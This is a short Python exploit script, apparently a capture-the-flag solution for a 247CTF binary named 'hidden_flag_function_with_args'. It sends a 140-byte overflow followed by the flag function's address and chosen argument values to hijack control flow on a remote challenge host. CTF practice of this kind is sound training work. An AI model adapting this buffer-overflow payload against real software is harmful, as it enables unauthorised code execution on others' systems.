#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe  = context.binary = ELF('./hidden_flag_function_with_args')
host = args.HOST or 'df8c95669a18ceb4.247ctf.com'
port = int(args.PORT or 50476)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

libc=SetupLibcELF()
io = start()

payload = b"A"*140 + p(exe.sym.flag) + p(0xdeadbeef) + p(0x1337) + p(0x247) + p(0x12345678)
re()
sl(payload)

io.interactive()
